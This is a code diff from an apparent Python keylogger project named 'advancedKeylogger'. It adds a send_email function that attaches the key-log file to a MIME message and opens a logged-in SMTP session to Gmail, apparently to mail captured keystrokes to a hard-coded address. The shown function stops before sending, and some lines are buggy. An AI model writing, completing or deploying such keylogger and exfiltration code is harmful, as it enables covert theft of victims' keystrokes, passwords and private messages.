@@ -34,8 +34,50 @@ from multiprocessing import Process, freeze_support
 
 # textfile
 keys_infomration = "key_log.txt"
+email_address = "halladkarthik@gmail.com"
+password = ""
+toaddr = "halladkarthik@gmail.com"
 file_path = "C:\\Users\\karth\\PycharmProjects\\advancedKeylogger"
 extend = "\\"  # to extend the file path to key info
+
+#email
+def send_email(filename,attachment,toaddr):
+    fromaddr = email_address;
+
+    msg = MIMEMultipart()
+
+    msg['From'] =fromaddr
+    msg['To'] = toaddr
+    msg['Subject'] = 'Log File ' + time.time()
+    body = "body of the mail"
+
+    #attach this to the message
+    msg.attach(MIMEText(body,'plain'))
+
+    #attachment using MIME
+    filename = filename
+    attachment = open(filename,'rb')
+
+    #default code for MIME
+    p =MIMEBase('application','octet-stream')
+
+    p.set_payload((attachment).read())
+
+    #encoding the email infromation
+    encoders.encode_base64(p)
+
+    p.add_header('Content-Disposition',"attachment : filename = %s" % filename)
+
+    msg.attach(p)
+    #file successfully attached after creating a MIMEBASE instance
+
+    #starting the stmp session
+    s=smtplib.SMTP('smtp.gmail.com',587) #port
+    s.starttls()
+    s.login(fromaddr,password)
+
+    text = msg.as_string()
+
 
 count = 0;
 keys = []
